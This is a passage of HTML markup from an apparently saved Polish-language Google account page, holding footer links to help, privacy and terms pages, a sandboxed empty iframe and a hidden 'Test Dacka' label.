                                <div class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob-XxIAqe-OWXEXe-tsQazb VfPpkd-xl07Ob VfPpkd-YPmvEd s8kOBc dmaMHc sf-hidden" jsname=xl07Ob jscontroller=ywOR5c jsaction=keydown:I481le;JIbuQc:j697N(rymPhb);XVaHYd:c9v4Fb(rymPhb);Oyo5M:b5fzT(rymPhb);DimkCe:TQSy7b(rymPhb);m0LGSd:fAWgXe(rymPhb);WAiFGd:kVJJuc(rymPhb); data-is-hoisted=false data-should-flip-corner-horizontally=false></div>
                            </div>
                        </div>
                    </div>
                    <ul class=kJOS4>
                        <li class=r7XTUb>
                            <a class=NUwdAb href="https://support.google.com/accounts?hl=pl&amp;p=account_iph" target=_blank>Pomoc</a>
                        <li class=r7XTUb>
                            <a class=NUwdAb href="https://accounts.google.com/TOS?loc=PL&amp;hl=pl&amp;privacy=true" target=_blank>Prywatność</a>
                        <li class=r7XTUb>
                            <a class=NUwdAb href="https://accounts.google.com/TOS?loc=PL&amp;hl=pl" target=_blank>Warunki</a>
                    </ul>
                </footer>
                <c-data id=i1 jsdata=" OsjLy;_;4" class=sf-hidden></c-data>
            </c-wiz>
        </div>
        <div class=iNstf aria-hidden=true></div>
    </div>
    <iframe height=0 width=0 tabindex=-1 sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation" style=position:absolute;left:0px;top:0px;z-index:-1 srcdoc="
															<html>
																<meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:;&quot;>
																	<style>img[src=&quot;data:,&quot;],source[src=&quot;data:,&quot;]{display:none!important}</style>">
    </iframe>
    <div aria-live=assertive aria-relevant=additions aria-atomic=true aria-hidden=true style=color:transparent;z-index:-1;position:absolute;top:0px;left:0px;user-select:none>
        <div aria-atomic=true>Test Dacka </div>
    </div>
    <iframe style=display:none></iframe>